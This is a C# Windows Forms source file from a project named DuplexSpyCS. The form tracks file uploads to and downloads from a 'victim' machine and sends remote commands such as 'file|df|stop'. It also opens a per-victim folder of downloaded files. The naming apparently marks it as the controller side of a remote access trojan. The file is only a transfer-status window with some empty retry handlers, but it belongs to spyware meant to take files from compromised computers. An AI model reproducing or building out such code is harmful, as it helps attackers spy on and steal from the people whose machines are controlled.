using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmFileTransferState : Form
    {
        public clsVictim v;
        public List<string> files;
        private int cnt_ok;

        public frmManager f_mgr;

        public TransferFileType transfer_type;

        public delegate void FileTransferCompletedHandler();
        public FileTransferCompletedHandler FileTransferCompleted;

        public frmFileTransferState()
        {
            InitializeComponent();
        }

        public void UpdateState(string filename, string state)
        {
            Invoke(new Action(() =>
            {
                ListViewItem i = null;
                foreach (ListViewItem item in listView1.Items)
                {
                    if (item.Tag.ToString() == filename)
                    {
                        i = item;
                        break;
                    }
                }

                if (i != null && i.SubItems[1].Text != "OK")
                {
                    i.SubItems[1].Text = state;
                    toolStripStatusLabel1.Text = $"{cnt_ok}/{files.Count}";
                }

                if (string.Equals(i.SubItems[1].Text, "OK"))
                {
                    cnt_ok++;
                    if (cnt_ok == files.Count)
                    {
                        toolStripStatusLabel1.Text = "All file transferd successfully !";

                        FileTransferCompleted?.Invoke();

                        if (transfer_type == TransferFileType.Upload)
                            f_mgr.fileLV_Refresh();
                    }
                }
            }));
        }

        void setup()
        {
            toolStripStatusLabel1.Text = string.Empty;
            cnt_ok = 0;

            foreach (string file in files)
            {
                ListViewItem item = new ListViewItem(Path.GetFileName(file));
                item.SubItems.Add("?");
                item.Tag = file;
                listView1.Items.Add(item);
            }
        }

        private void frmFileTransferStatus_Load(object sender, EventArgs e)
        {
            setup();
        }

        //Pause/Resume
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            if (f_mgr == null)
            {
                MessageBox.Show("f_mgr is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (toolStripButton2.Text == "Pause")
            {
                if (transfer_type == TransferFileType.Upload)
                {
                    f_mgr.g_bUploadPause = true;
                }
                else //Download
                {
                    v.SendCommand("file|df|pause");
                }

                toolStripButton2.Text = "Resume";
            }
            else
            {
                if (transfer_type == TransferFileType.Upload)
                {
                    f_mgr.g_bUploadPause = false;
                }
                else //Download
                {
                    v.SendCommand("file|df|resume");
                }

                toolStripButton2.Text = "Pause";
            }
        }
        //Stop
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            if (f_mgr == null)
            {
                MessageBox.Show("f_mgr is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (transfer_type == TransferFileType.Upload)
            {
                f_mgr.g_bUploadPause = false;
                f_mgr.g_bUploadFile = false;
            }
            else //Download
            {
                v.SendCommand("file|df|stop");
            }
        }

        //Victim Download Folder
        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            string path = Path.Combine(v.dir_victim, "Downloads");
            Process.Start("explorer.exe", path);
        }

        private void frmFileTransferState_FormClosed(object sender, FormClosedEventArgs e)
        {

        }

        //Retry
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {

        }
        //Retry all
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {

        }
        //Next
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {

        }
    }
}
